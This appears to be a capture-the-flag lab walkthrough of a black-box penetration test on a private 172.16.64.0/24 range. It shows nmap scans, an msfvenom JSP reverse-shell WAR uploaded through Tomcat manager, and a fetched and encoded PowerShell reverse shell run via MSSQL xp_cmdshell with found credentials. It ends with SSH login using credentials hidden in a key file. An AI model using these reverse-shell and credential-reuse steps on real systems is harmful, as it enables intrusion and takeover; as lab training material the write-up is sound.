---
description: >-
  You have been engaged in a Black-box Penetration Test (172.16.64.0/24 range).
  Your goal is to read the flag file on each machine.
---

# Black Box Test 1

### Discover live hosts on the network

```bash
sudo nmap -sn 172.16.64.0/24 --exclude 172.16.64.10 -oN hostAlive.nmap
cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt
sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
```

#### Nmap options

* `-sV` for version identification 
* `-n` for disabling reverse DNS lookup 
* `-v` for Verbose 
* `-Pn` to assume the host is alive 
* `-p-` to scan all the ports 
* `-T4` to speed things up 
* `-iL` to use a list of IPs as input \(ips.txt\) 
* `--open` to see just open ports and not closed / filtered ones 
* `-A` for detailed information and running some scripts

#### Hosts Alive

| Host | OS |
| :--- | :--- |
| 172.16.64.101 | Linux |
| 172.16.64.140 | Linux |
| 172.16.64.182 | Linux |
| 172.16.64.199 | Windows |

### Open Ports and Running Services

####  172.16.64.101

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 22 | ssh | OpenSSH 7.2p2 |
| 8080 | http | Apache Tomcat/Coyote JSP engine 1.1 |
| 9080 | http | Apache Tomcat/Coyote JSP engine 1.1 |

#### 172.16.64.140

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 80 | http | Apache httpd 2.4.18 |

#### 172.16.64.182

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 22 | ssh | OpenSSH 7.2p2 |

#### 172.16.64.199

| Port Number | Service | Version |
| :--- | :--- | :--- |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds |  |
| 1433 | ms-sql-s | Microsoft SQL Server 2014 |

### Machines

#### 172.16.64.101

Apache Tomcat has [http://172.16.64.101:8080/manager/html](http://172.16.64.101:8080/manager/html) as a management url. In case your authentication fail several times, a 401 page is presented, with a default username and password:

![](../../.gitbook/assets/image.png)

```bash
# Terminal 1
nc -l -p 8080

# Terminal 2
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=8080 -f war -o revshell.war

# 1. Upload to http://172.16.64.10/manager/html
# 2. Open the suggested url in your browser to execute the reverse shell
# 3. Go to your opened nc listener on Terminal one and execute:
find / | grep flag.txt
/home/developer/flag.txt
/home/adminels/Desktop/flag.txt

# Your results should be something like:
cat /home/developer/flag.txt
Congratulations, you got it!
cat /home/adminels/Desktop/flag.txt
You did it!
```

#### 172.16.64.140

Using Dirbuster we find a secret folder called **project**. This url is accessible under **admin/admin** credentials.

![](../../.gitbook/assets/image%20%281%29.png)

![We find suspicious files under /project/backup/test](../../.gitbook/assets/image%20%283%29.png)

![](../../.gitbook/assets/image%20%282%29.png)

{% embed url="http://172.16.64.140/project/backup/test/sdadas.txt" %}

```text
Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
/var/www/html/project/354253425234234/flag.txt
```

#### 172.16.64.199

```bash
wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1;
sed -i 's/127.0.0.1/172.16.64.10/; s/413/1234/' mini-reverse.ps1
cat mini-reverse.ps1 | iconv -f ascii -t utf16 | tail -c +3  | base64 -w 0 > encoded_payload
cat encoded_payload # We'll use this payload in our shell
# Open listener In your terminal
```

```bash
nc -lvnp 1234
```

```bash
# Use the credentials found in the fuzzed file under 
# project/backup/test in the previous machine
python2 /usr/share/doc/python3-impacket/examples/mssqlclient.py fooadmin:fooadmin@172.16.64.199
enable_xp_cmdshell
RECONFIGURE
xp_cmdshell whoami
xp_cmdshell powershell -e <payload_from_previous_step>
```

```text
cd c:\
where /r c:\ flag.txt
cd c:\Users\AdminELS\Desktop\
cat flag.txt
Congratulations! You exploited this machine! 
PS C:\Users\AdminELS\Desktop> cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################
```

We find at the end of the `id_rsa.pub` file there are some ssh credentials for the remaining active machine:

#### 172.16.64.182

We use the credentials harvested in the Windows machine:

```bash
sshpass -p dF3334slKw ssh developer@172.16.64.182
find . | grep flag
cat flag.txt 
Congratulations, you got it!
```

